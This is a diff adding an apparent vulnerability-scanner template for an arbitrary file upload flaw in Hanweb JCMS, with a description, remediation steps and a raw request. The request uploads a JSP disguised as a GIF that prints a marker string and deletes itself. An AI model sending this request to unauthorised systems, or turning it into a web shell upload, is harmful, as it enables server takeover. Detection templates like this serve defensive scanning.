@@ -1,0 +1,56 @@
+id: JCMS-lm_sys_opr_uploadimg_JSP-FileUpload
+info:
+  name: 大汉(hanweb)jcms /lm/sys/opr_uploadimg.jsp 文件上传漏洞
+  author:
+  - l0ne1y
+  description: |-
+    大汉JCMS opr_uploadimg.jsp 任意文件上传漏洞
+    大汉JCMS是一款内容管理系统，基于J2EE构架设计。系统提供了从内容采集、创建、管理、传递、发布、共享呈送等信息全生命周期过程中所需的各项功能。
+
+    大汉JCMS存在任意文件上传漏洞。远程攻击者可以利用该漏洞上传文件并执行代码。
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.hanweb.com/
+
+    临时修复方案：
+    1、服务器端将文件上传目录直接设置为不可执行。
+    2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。
+    3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。
+    4、单独设置文件服务器的域名。
+    5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。
+    6、修复服务器可能存在的解析漏洞。
+    7、严格限制可以修改服务器配置的文件上传如：.htaccess。
+    8、隐藏上传文件路径。
+    9、及时修复Web上传代码。
+    10、不能有本地文件包含漏洞。
+requests:
+- raw:
+  - |
+    POST /lm/sys/opr_uploadimg.jsp?action=upload&img=testvul.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Length: 376
+    Content-Type: multipart/form-data; boundary=4e400c16cce04a9d803521e49ff67443
+    Connection: Keep-Alive
+    Accept: */*
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
+
+    --4e400c16cce04a9d803521e49ff67443
+    Content-Disposition: form-data; name="NewFile"; filename="57h9.gif"
+    Content-Type: image/gif
+
+    <%
+    out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+    new java.io.File(application.getRealPath(request.getServletPath())).delete();
+    %>
+    --4e400c16cce04a9d803521e49ff67443--
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200 && contains(body,"e165421110ba03099a1c0393373c5b43")
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/images/testvul.jsp'
+  method: GET
